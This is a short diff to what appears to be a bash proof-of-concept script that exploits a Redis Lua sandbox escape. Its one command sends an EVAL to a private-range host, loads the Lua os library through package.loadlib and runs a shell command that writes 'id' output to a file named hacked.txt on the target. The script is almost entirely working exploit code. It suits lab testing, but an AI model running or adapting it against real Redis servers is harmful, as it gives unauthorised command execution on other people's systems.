@@ -1,3 +1,5 @@
+#!/bin/bash
+
 # Creates a file on the target
 redis-cli -h 192.168.56.113 EVAL 'local f = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = f(); return os.execute("id > /var/lib/redis/hacked.txt");' 0
 
